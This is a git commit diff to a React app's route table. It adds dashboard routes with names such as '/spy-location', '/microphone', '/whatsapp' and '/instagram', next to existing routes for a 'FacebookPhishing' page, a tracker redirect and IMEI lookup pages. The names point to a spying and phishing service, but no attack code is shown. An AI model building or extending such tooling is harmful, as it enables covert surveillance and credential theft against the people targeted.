3bbe5e5b60b82cef68b3bc8c30129a017e17b28e
ghostkyle24 <painel@ftm.com>
2025-08-03 15:18:50 -0300

    m

--- src/App.js
+++ src/App.js
@@ -312,14 +312,20 @@ function App() {
           <Dashboard email={usuario} />
         )
       } />
+      <Route path="/whatsapp" element={<Dashboard email={usuario} />} />
+      <Route path="/spy-location" element={<Dashboard email={usuario} />} />
+      <Route path="/facebook" element={<Dashboard email={usuario} />} />
+      <Route path="/microphone" element={<Dashboard email={usuario} />} />
+      <Route path="/instagram" element={<Dashboard email={usuario} />} />
+      <Route path="/lessons" element={<Dashboard email={usuario} />} />
+      <Route path="/faq" element={<Dashboard email={usuario} />} />
+      <Route path="/support" element={<Dashboard email={usuario} />} />
+      <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
+      <Route path="/imei-support-request" element={<IMEISupportRequest />} />
       <Route path="/redirect/:id" element={<TrackerPage />} />
       <Route path="/facebook/:id" element={<FacebookPhishing />} />
       <Route path="/microphone/:id" element={<MicrophonePage />} />
       <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
-      <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
-      <Route path="/imei-support-request" element={<IMEISupportRequest />} />
-      <Route path="/faq" element={<Dashboard email={usuario} />} />
-      <Route path="/support" element={<Dashboard email={usuario} />} />
     </Routes>
   );
 }
